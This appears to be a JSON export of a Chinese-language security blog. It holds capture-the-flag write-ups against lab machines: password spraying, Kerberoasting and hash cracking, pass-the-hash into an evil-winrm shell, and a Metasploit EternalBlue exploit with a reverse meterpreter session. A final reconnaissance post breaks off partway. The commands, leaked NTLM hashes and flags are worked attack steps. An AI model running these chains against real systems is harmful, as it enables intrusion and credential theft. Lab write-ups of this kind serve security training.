SMB\u6f0f\u6d1e\u626b\u63cf\n\n\u4f7f\u7528 `nmap` \u7684\u6f0f\u6d1e\u811a\u672c\u626b\u63cfSMB\u670d\u52a1\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap --script=vuln -p445,139 192.168.205.131\n...\nHost script results:\n|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR\n|_smb-vuln-ms10-054: false\n|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR\n...\n```\n\n\u672a\u53d1\u73b0\u660e\u663e\u7684CVE\u6f0f\u6d1e\uff0c\u7ee7\u7eed\u8fdb\u884c\u5176\u4ed6\u679a\u4e3e\u3002\n\n# \u4e09\u3001SMB\u679a\u4e3e\n\n## 3.1 SMB\u5171\u4eab\u679a\u4e3e\n\n\u4f7f\u7528 `smbclient` \u5217\u4e3eSMB\u5171\u4eab\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ smbclient -L //192.168.205.131/ -N\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        backup          Disk    \n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        NETLOGON        Disk      Logon server share \n        SYSVOL          Disk      Logon server share \n        Users           Disk    \n```\n\n\u53d1\u73b0\u4e00\u4e2a\u540d\u4e3a `backup` \u7684\u5171\u4eab\uff0c\u8fd9\u53ef\u80fd\u5305\u542b\u6709\u7528\u4fe1\u606f\u3002\n\n## 3.2 SMB\u5171\u4eab\u8bbf\u95ee\u6d4b\u8bd5\n\n\u5c1d\u8bd5\u533f\u540d\u8bbf\u95ee\u5404\u4e2a\u5171\u4eab\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ smbclient //192.168.205.131/backup -N \nTry 'help' to get a list of possible commands.\nsmb: \\> dir\nNT_STATUS_ACCESS_DENIED listing \\*\n```\n\n\u6240\u6709\u5171\u4eab\u90fd\u62d2\u7edd\u533f\u540d\u8bbf\u95ee\uff0c\u9700\u8981\u83b7\u53d6\u6709\u6548\u51ed\u636e\u3002\n\n# \u56db\u3001\u57df\u4fe1\u606f\u679a\u4e3e\n\n## 4.1 \u4f7f\u7528enum4linux-ng\u679a\u4e3e\u57df\u4fe1\u606f\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ enum4linux-ng -A 192.168.205.131\n...\n[+] Long domain name is: SOUPEDECODE.LOCAL\n[+] Got domain/workgroup name: SOUPEDECODE\n...\nNetBIOS computer name: DC01\nNetBIOS domain name: SOUPEDECODE\nDNS domain: SOUPEDECODE.LOCAL\nFQDN: DC01.SOUPEDECODE.LOCAL\n...\n[+] Server allows authentication via username 'iutprjyw' and password ''\n[H] Rerunning enumeration with user 'iutprjyw' might give more results\n...\n```\n\n\u83b7\u53d6\u5230\u57df\u4fe1\u606f\uff1a\n\n- \u57df\u540d\uff1a`SOUPEDECODE.LOCAL`\n- \u57df\u63a7\u5236\u5668\uff1a`DC01.SOUPEDECODE.LOCAL`\n\n## 4.2 \u6dfb\u52a0\u57df\u540d\u89e3\u6790\n\n\u5c06\u57df\u540d\u6dfb\u52a0\u5230 `/etc/hosts` \u6587\u4ef6\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo nano /etc/hosts\n\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ tail -n 1 /etc/hosts\n192.168.205.131 SOUPEDECODE.LOCAL\n```\n\n# \u4e94\u3001\u7528\u6237\u679a\u4e3e\u4e0e\u5bc6\u7801\u7206\u7834\n\n## 5.1 SID\u679a\u4e3e\u83b7\u53d6\u7528\u6237\u5217\u8868\n\n\u4f7f\u7528 `lookupsid.py` \u679a\u4e3e\u57df\u7528\u6237\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ python3 /usr/share/doc/python3-impacket/examples/lookupsid.py anonymous@192.168.205.131\n...\n[*] Domain SID is: S-1-5-21-2986980474-46765180-2505414164\n498: SOUPEDECODE\\Enterprise Read-only Domain Controllers (SidTypeGroup)\n500: SOUPEDECODE\\Administrator (SidTypeUser)\n501: SOUPEDECODE\\Guest (SidTypeUser)\n502: SOUPEDECODE\\krbtgt (SidTypeUser)\n...\n```\n\n\u63d0\u53d6\u7528\u6237\u540d\u5217\u8868\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ python3 /usr/share/doc/python3-impacket/examples/lookupsid.py anonymous@192.168.205.131 2>/dev/null | grep '(SidTypeUser)' | cut -d '\\' -f2 | cut -d ' ' -f1 > user\n```\n\n## 5.2 \u5bc6\u7801\u55b7\u6d12\u653b\u51fb\n\n\u4f7f\u7528 `crackmapexec` \u8fdb\u884c\u5bc6\u7801\u55b7\u6d12\uff08\u7528\u6237\u540d\u4f5c\u4e3a\u5bc6\u7801\uff09\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ crackmapexec smb 192.168.205.131 -u user -p user --continue-on-success --no-bruteforce | grep '+'\nSMB         192.168.205.131 445    DC01    [+] SOUPEDECODE.LOCAL\\ybob317:ybob317\n```\n\n\u6210\u529f\u627e\u5230\u5f31\u5bc6\u7801\u7528\u6237\uff1a`ybob317:ybob317`\n\n# \u516d\u3001Kerberoasting\u653b\u51fb\n\n## 6.1 \u83b7\u53d6\u670d\u52a1\u7968\u636e\n\n\u4f7f\u7528\u83b7\u5f97\u7684\u51ed\u636e\u8fdb\u884cKerberoasting\u653b\u51fb\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py SOUPEDECODE.LOCAL/ybob317:ybob317 -dc-ip 192.168.205.131 -request\n...\n$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$S...\n```\n\n\u6210\u529f\u83b7\u53d6\u5230\u670d\u52a1\u8d26\u6237\u7684Kerberos\u7968\u636e\u3002\n\n## 6.2 \u7834\u89e3\u670d\u52a1\u8d26\u6237\u5bc6\u7801\n\n\u4f7f\u7528 `john` \u7834\u89e3Kerberos\u7968\u636e\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ john --wordlist=/usr/share/wordlists/rockyou.txt hash\n...\nPassword123!!    (?)   \n1g 0:00:00:09 DONE (2025-08-30 18:22) 0.1054g/s 1513Kp/s 7184Kc/s 7184KC/s\n```\n\n\u7834\u89e3\u51fa\u5bc6\u7801\uff1a`Password123!!`\n\n## 6.3 \u5bc6\u7801\u55b7\u6d12\u9a8c\u8bc1\n\n\u4f7f\u7528\u7834\u89e3\u51fa\u7684\u5bc6\u7801\u8fdb\u884c\u5bc6\u7801\u55b7\u6d12\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ crackmapexec smb 192.168.205.131 -u user -p 'Password123!!' --continue-on-success| grep '+' \nSMB         192.168.205.131 445    DC01    [+] SOUPEDECODE.LOCAL\\file_svc:Password123!!\n```\n\n\u786e\u8ba4 `file_svc` \u8d26\u6237\u5bc6\u7801\u4e3a `Password123!!`\n\n# \u4e03\u3001\u6743\u9650\u63d0\u5347\n\n## 7.1 \u8bbf\u95eebackup\u5171\u4eab\n\n\u4f7f\u7528 `file_svc` \u8d26\u6237\u8bbf\u95ee\u4e4b\u524d\u65e0\u6cd5\u8bbf\u95ee\u7684 `backup` \u5171\u4eab\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nxc smb 192.168.205.131 -u 'file_svc' -p 'Password123!!' --shares --no-bruteforce\n...\nSMB         192.168.205.131 445    DC01    backup          READ          \n...\n```\n\n## 7.2 \u83b7\u53d6\u5907\u4efd\u6587\u4ef6\n\n\u8fde\u63a5\u5230backup\u5171\u4eab\u5e76\u4e0b\u8f7d\u6587\u4ef6\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ smbclient //192.168.205.131/backup -U file_svc\nPassword for [WORKGROUP\\file_svc]:\nsmb: \\> DIR\n  .                                   D        0  Mon Jun 17 13:41:17 2024\n  ..                                 DR        0  Mon Jun 17 13:44:56 2024\n  backup_extract.txt                  A      892  Mon Jun 17 04:41:05 2024\nsmb: \\> get backup_extract.txt \ngetting file \\backup_extract.txt of size 892 as backup_extract.txt (43.6 KiloBytes/sec)\n```\n\n## 7.3 \u5206\u6790\u5907\u4efd\u6587\u4ef6\n\n\u67e5\u770b\u5907\u4efd\u6587\u4ef6\u5185\u5bb9\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ cat backup_extract.txt \nWebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::\nDatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::\nCitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::\nFileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::\nMailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::\nBackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::\nApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e9f5:::\nPrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::\nProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::\nMonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::\n```\n\n\u53d1\u73b0\u4e86\u591a\u4e2a\u8ba1\u7b97\u673a\u8d26\u6237\u7684NTLM\u54c8\u5e0c\u503c\uff01\n\n## 7.4 \u54c8\u5e0c\u4f20\u9012\u653b\u51fb\n\n\u63d0\u53d6\u7528\u6237\u540d\u548c\u54c8\u5e0c\u503c\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ awk -F '[:]' '{print $1}' backup_extract.txt > user\n\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ awk -F '[:]' '{print $4}' backup_extract.txt > pass\n```\n\n\u4f7f\u7528\u54c8\u5e0c\u8fdb\u884c\u8ba4\u8bc1\u6d4b\u8bd5\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ crackmapexec smb 192.168.205.131 -u user -H pass --continue-on-success| grep '+'      \nSMB         192.168.205.131 445    DC01    [+] SOUPEDECODE.LOCAL\\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)\n```\n\n`FileServer$` \u8d26\u6237\u5177\u6709\u7ba1\u7406\u5458\u6743\u9650\uff01\n\n# \u516b\u3001\u83b7\u53d6\u7cfb\u7edf\u8bbf\u95ee\u6743\u9650\n\n## 8.1 \u901a\u8fc7WinRM\u83b7\u53d6Shell\n\n\u4f7f\u7528 `FileServer$` \u7684NTLM\u54c8\u5e0c\u901a\u8fc7WinRM\u83b7\u53d6\u7cfb\u7edf\u8bbf\u95ee\u6743\u9650\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ evil-winrm -i 192.168.205.131 -u 'FileServer$' -H 'e41da7e79a4c76dbd9cf79d1cb325559'\n                                      \nEvil-WinRM shell v3.7\n...\n*Evil-WinRM* PS C:\\Users\\FileServer$\\Documents> whoami /all\n\nUSER INFORMATION\n----------------\nUser Name               SID\n======================= ============================================\nsoupedecode\\fileserver$ S-1-5-21-2986980474-46765180-2505414164-2065\n\nGROUP INFORMATION\n-----------------\nGroup Name                                         Type             SID                                         Attributes\n================================================== ================ =========================================== ===============================================================\n...\nBUILTIN\\Administrators                             Alias            S-1-5-32-544                                Mandatory group, Enabled by default, Enabled group, Group owner\n...\nSOUPEDECODE\\Enterprise Admins                      Group            S-1-5-21-2986980474-46765180-2505414164-519 Mandatory group, Enabled by default, Enabled group\n...\n```\n\n\u6210\u529f\u83b7\u53d6\u5230\u5177\u6709\u7ba1\u7406\u5458\u6743\u9650\u7684\u7cfb\u7edf\u8bbf\u95ee\uff01\n\n## 8.2 \u83b7\u53d6Flag\n\n\u67e5\u627e\u5e76\u83b7\u53d6\u7528\u6237\u548c\u7ba1\u7406\u5458Flag\uff1a\n\n```bash\n*Evil-WinRM* PS C:\\Users> dir *.txt -R\n...\n    Directory: C:\\Users\\Administrator\\Desktop\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-a----         6/17/2024  10:44 AM             32 root.txt\n\n    Directory: C:\\Users\\ybob317\\Desktop\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-a----         6/12/2024   4:54 AM             32 user.txt\n\n*Evil-WinRM* PS C:\\Users> type C:\\Users\\Administrator\\Desktop\\root.txt\na9564ebc3289b7a14551baf8ad5ec60a\n\n*Evil-WinRM* PS C:\\Users> type C:\\Users\\ybob317\\Desktop\\user.txt\n6bab1f09a7403980bfeb4c2b412be47b\n```\n\nsentence", "top": 0, "createdAt": 1756563935, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-30", "dateLabelColor": "#0969da"}, "P236": {"htmlDir": "docs/post/thl_Microchoft.html", "labels": ["thehackerlabs"], "postTitle": "thl_Microchoft", "postUrl": "post/thl_Microchoft.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/236", "commentNum": 0, "wordCount": 4456, "description": "# \u4e00\u3001\u4fe1\u606f\u6536\u96c6\n\n## 1.1 \u4e3b\u673a\u53d1\u73b0\n\n\u4f7f\u7528 `arp-scan` \u626b\u63cf\u5c40\u57df\u7f51\u5185\u7684\u4e3b\u673a\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo arp-scan -l\n...\n192.168.205.132 08:00:27:03:82:a3       PCS Systemtechnik GmbH\n...\n```\n\n\u53d1\u73b0\u76ee\u6807\u4e3b\u673a\uff1a`192.168.205.132`\n\n## 1.2 \u7aef\u53e3\u626b\u63cf\n\n\u4f7f\u7528 `rustscan` \u8fdb\u884c\u7aef\u53e3\u626b\u63cf\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ rustscan -a 192.168.205.132\n...\nOpen 192.168.205.132:135\nOpen 192.168.205.132:139\nOpen 192.168.205.132:445\n```\n\n\u53d1\u73b0\u5f00\u653e\u7aef\u53e3\uff1a\n\n- **135/tcp**\uff1aRPC\u7aef\u70b9\u6620\u5c04\u5668\n- **139/tcp**\uff1aNetBIOS\u4f1a\u8bdd\u670d\u52a1\n- **445/tcp**\uff1aSMB\u670d\u52a1\n\n\u6839\u636e\u7aef\u53e3\u7279\u5f81\u5224\u65ad\u8fd9\u662f\u4e00\u53f0Windows\u4e3b\u673a\uff0c\u4e14\u5f00\u653e\u4e86SMB\u670d\u52a1\u3002\n\n# \u4e8c\u3001\u6f0f\u6d1e\u626b\u63cf\n\n## 2.1 SMB\u6f0f\u6d1e\u626b\u63cf\n\n\u4f7f\u7528 `nmap` \u7684\u6f0f\u6d1e\u811a\u672c\u626b\u63cfSMB\u670d\u52a1\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap --script=vuln -p445,139 192.168.205.132\n...\n| smb-vuln-ms17-010: \n|   VULNERABLE:\n|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2017-0143\n|     Risk factor: HIGH\n|       A critical remote code execution vulnerability exists in Microsoft SMBv1\n|        servers (ms17-010).\n|         \n|     Disclosure date: 2017-03-14\n|     References:\n|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143\n|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx\n...\n```\n\n**\u91cd\u8981\u53d1\u73b0**\uff1a\u76ee\u6807\u4e3b\u673a\u5b58\u5728 **MS17-010\uff08\u6c38\u6052\u4e4b\u84dd\uff09** \u6f0f\u6d1e\uff01\n\n# \u4e09\u3001\u6f0f\u6d1e\u5229\u7528\n\n## 3.1 \u542f\u52a8Metasploit Framework\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ msfconsole\n...\nmsf >\n```\n\n## 3.2 \u641c\u7d22MS17-010\u76f8\u5173\u6a21\u5757\n\n```bash\nmsf > search ms17-010\n\nMatching Modules\n================\n\n   #   Name                                           Disclosure Date  Rank     Check  Description\n   -   ----                                           ---------------  ----     -----  -----------\n   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption\n   1   exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution\n   ...\n```\n\n## 3.3 \u914d\u7f6e\u548c\u6267\u884cEternalBlue\u653b\u51fb\n\n\u9009\u62e9EternalBlue\u6a21\u5757\u5e76\u914d\u7f6e\u53c2\u6570\uff1a\n\n```bash\nmsf > use 0\n[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp\n\nmsf exploit(windows/smb/ms17_010_eternalblue) > show options\n...\nmsf exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.205.132\nRHOSTS => 192.168.205.132\n\nmsf exploit(windows/smb/ms17_010_eternalblue) > run\n```\n\n## 3.4 \u653b\u51fb\u6267\u884c\u8fc7\u7a0b\n\n```bash\n[*] Started reverse TCP handler on 192.168.205.128:4444 \n[*] 192.168.205.132:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check\n[+] 192.168.205.132:445   - Host is likely VULNERABLE to MS17-010! - Windows 7 Home Basic 7601 Service Pack 1 x64 (64-bit)\n[+] 192.168.205.132:445 - The target is vulnerable.\n[*] 192.168.205.132:445 - Connecting to target for exploitation.\n[+] 192.168.205.132:445 - Connection established for exploitation.\n[+] 192.168.205.132:445 - Target OS selected valid for OS indicated by SMB reply\n...\n[+] 192.168.205.132:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!\n[*] 192.168.205.132:445 - Sending egg to corrupted connection.\n[*] 192.168.205.132:445 - Triggering free of corrupted buffer.\n[*] Sending stage (203846 bytes) to 192.168.205.132\n[*] Meterpreter session 1 opened (192.168.205.128:4444 -> 192.168.205.132:49159)\n[+] 192.168.205.132:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n[+] 192.168.205.132:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n[+] 192.168.205.132:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n```\n\n**\u653b\u51fb\u6210\u529f\uff01**\u83b7\u5f97\u4e86Meterpreter\u4f1a\u8bdd\uff0c\u8868\u660e\u5df2\u7ecf\u83b7\u53d6\u4e86\u7cfb\u7edf\u6700\u9ad8\u6743\u9650\u3002\n\n# \u56db\u3001\u7cfb\u7edf\u8bbf\u95ee\u4e0e\u4fe1\u606f\u6536\u96c6\n\n## 4.1 \u83b7\u53d6\u7cfb\u7edfShell\n\n```bash\nmeterpreter > shell\nProcess 1376 created.\nChannel 1 created.\nMicrosoft Windows [Version 6.1.7601]\nCopyright (c) 2009 Microsoft Corporation.  All rights reserved.\n\nC:\\Windows\\system32>\n```\n\n\u786e\u8ba4\u83b7\u5f97\u4e86Windows 7\u7cfb\u7edf\u7684SYSTEM\u6743\u9650\u8bbf\u95ee\u3002\n\n## 4.2 \u67e5\u627eFlag\u6587\u4ef6\n\n\u5728\u7528\u6237\u76ee\u5f55\u4e2d\u9012\u5f52\u641c\u7d22txt\u6587\u4ef6\uff1a\n\n```bash\nC:\\Users>dir *.txt /S\n...\n Directory of C:\\Users\\Admin\\Desktop\n03/28/2024  06:51 PM                32 admin.txt.txt\n\n Directory of C:\\Users\\Lola\\Desktop\n03/28/2024  06:54 PM                32 user.txt\n...\n```\n\n\u53d1\u73b0\u4e24\u4e2a\u5173\u952e\u6587\u4ef6\uff1a\n\n- \u7ba1\u7406\u5458Flag\uff1a`C:\\Users\\Admin\\Desktop\\admin.txt.txt`\n- \u7528\u6237Flag\uff1a`C:\\Users\\Lola\\Desktop\\user.txt`\n\n## 4.3 \u83b7\u53d6Flag\n\n```bash\nC:\\Users>type C:\\Users\\Lola\\Desktop\\user.txt\n13e624146d31ea232c850267c2745caa\n\nC:\\Users>type C:\\Users\\Admin\\Desktop\\admin.txt.txt\nff4ad2daf333183677e02bf8f67d4dca\n```\n\n\u6210\u529f\u83b7\u53d6\u7528\u6237\u548c\u7ba1\u7406\u5458Flag\uff01sentence", "top": 0, "createdAt": 1756564639, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-30", "dateLabelColor": "#0969da"}, "P237": {"htmlDir": "docs/post/hmv_Ximai.html", "labels": ["HackMyVM"], "postTitle": "hmv_Ximai", "postUrl": "post/hmv_Ximai.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/237", "commentNum": 0, "wordCount": 9407, "description": "# \u4e00\u3001\u4fe1\u606f\u6536\u96c6\n\n## \u7f51\u7edc\u626b\u63cf\n\n\u9996\u5148\u8fdb\u884c\u7f51\u7edc\u53d1\u73b0\uff0c\u5bfb\u627e\u76ee\u6807\u4e3b\u673a\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo arp-scan -l\n...\n192.168.205.131 08:00:27:f4:eb:fa       PCS Systemtechnik GmbH\n...\n```\n\n\u53d1\u73b0\u76ee\u6807IP\uff1a`192.168.205.131`\n\n## \u7aef\u53e3\u626b\u63cf\n\n\u5bf9\u76ee\u6807\u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap -p0-65535 192.168.205.131            \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-31 06:55 EDT\nNmap scan report for SOUPEDECODE.LOCAL (192.168.205.131)\nHost is up (0.000082s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\n8000/tcp open  http-alt\nMAC Address: 08:00:27:F4:EB:FA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 1.00 seconds\n```\n\n\u5f00\u653e\u7aef\u53e3\uff1a\n\n- 22/tcp - SSH\u670d\u52a1\n- 80/tcp - Web\u670d\u52a1\n- 3306/tcp - MySQL\u6570\u636e\u5e93\n- 8000/tcp - \u5907\u7528Web\u670d\u52a1\n\n# \u4e8c\u3001\u670d\u52a1\u679a\u4e3e\n\n## MySQL\u670d\u52a1\u6d4b\u8bd5\n\n\u5c1d\u8bd5\u8fde\u63a5MySQL\u670d\u52a1\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ mysql -h 192.168.205.131 -u root -p \nEnter password: \nERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '192.168.205.128' is not allowed to connect to this MariaDB server\n```\n\nMySQL\u670d\u52a1\u62d2\u7edd\u8fdc\u7a0b\u8fde\u63a5\uff0c\u9700\u8981\u5bfb\u627e\u5176\u4ed6\u5165\u53e3\u3002\n\n## Web\u670d\u52a1\u5206\u6790\uff0880\u7aef\u53e3\uff09\n\n\u8bbf\u95ee80\u7aef\u53e3\u663e\u793aApache2\u9ed8\u8ba4\u9875\u9762\uff0c\u8fdb\u884c\u76ee\u5f55\u626b\u63cf\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ dirsearch -u 192.168.205.131     \n...\n[07:15:39] 200 -    2KB - /adminer.php\n[07:15:46] 200 -   23KB - /info.php\n...\n```\n\n\u7ee7\u7eed\u4f7f\u7528gobuster\u8fdb\u884c\u66f4\u8be6\u7ec6\u7684\u626b\u63cf\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ gobuster dir -u http://192.168.205.131 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak -t 64 \n...\n/index.html           (Status: 200) [Size: 10938]\n/info.php             (Status: 200) [Size: 85870]\n/reminder.php         (Status: 200) [Size: 3163]\n/server-status        (Status: 403) [Size: 280]\n...\n```\n\n\u53d1\u73b0\u7684\u91cd\u8981\u6587\u4ef6\uff1a\n\n- `/adminer.php` - Adminer 5.3.0\u6570\u636e\u5e93\u7ba1\u7406\u5de5\u5177\n- `/info.php` - PHP\u4fe1\u606f\u9875\u9762\n- `/reminder.php` - \u63d0\u9192\u9875\u9762\n\n## \u5206\u6790reminder.php\u9875\u9762\n\n\u8bbf\u95ee`/reminder.php`\uff0c\u53d1\u73b0\u5305\u542b\u91cd\u8981\u4fe1\u606f\uff1a\n\n```html\n<div class='container'>\n    <h1>Web Portal</h1>\n    <p class='hint-text'>\n        jimmy! Don't forget we need to harden the security on the web server. In case you have forgotten your access details, I've put them in a txt file for you. It's in that place where I put that thing that time.\n    </p>\n\n    <img src='that-place-where-i-put-that-thing-that-time/1b260614-3aff-11f0-ac81-000c2921b441.jpg' alt='Mysterious Image'>\n\n    <p>\n        Also, can you fix this search box? Sometimes it chucks errors depending on what I enter...\n    </p>\n    <p class='hint-text'>\n        I'd do it myself, but I've been busy trying to create some code to enable us to securely store our passwords, seeing as you keep forgetting yours... The encoder seems completely borked though.\n    </p>\n\n    <form action='reminder.php' method='POST'>\n        <input type='text' name='username' placeholder='Username'>\n        <input type='submit' value='Lookup User'>\n    </form>\n</div>\n```\n\n\u9875\u9762\u63d0\u4f9b\u4e86\u91cd\u8981\u7ebf\u7d22\uff1a\n\n1. Jimmy\u7684\u8bbf\u95ee\u51ed\u636e\u5b58\u50a8\u5728txt\u6587\u4ef6\u4e2d\n2. \u8def\u5f84\u63d0\u793a\uff1a`that-place-where-i-put-that-thing-that-time/`\n\n\u8bbf\u95ee\u8be5\u8def\u5f84\uff0c\u53d1\u73b0\u76ee\u5f55\u5217\u8868\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl http://192.168.205.131/that-place-where-i-put-that-thing-that-time/\n...\nlrwxrwxrwx 1 root root   15 May 17 18:42 creds.txt -> /etc/jimmy.txt\n...\n```\n\n\u53d1\u73b0`creds.txt`\u662f\u6307\u5411`/etc/jimmy.txt`\u7684\u8f6f\u94fe\u63a5\u3002\n\n## Web\u670d\u52a1\u5206\u6790\uff088000\u7aef\u53e3\uff09\n\n\u8bbf\u95ee8000\u7aef\u53e3\u53d1\u73b0\u662fWordPress\u7ad9\u70b9\uff0c\u4f46\u57df\u540d\u8df3\u8f6c\u5230`wordpress.local`\uff0c\u9700\u8981\u6dfb\u52a0\u5230hosts\u6587\u4ef6\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ echo '192.168.205.131 wordpress.local' >> /etc/hosts\n```\n\nWordPress\u7ad9\u70b9\u5305\u542b\u4e00\u7bc7\u91cd\u8981\u6587\u7ae0\uff0c\u63d0\u793a\u7cfb\u7edf\u5b58\u5728\u5b89\u5168\u95ee\u9898\uff1a\n\n```\nDear Developer, We Need to Talk\u2026\n\nWhile casually browsing your blog system, I couldn't help but notice a few\u2026 quirks.\n\nFor starters, your php.ini is a bit too welcoming. 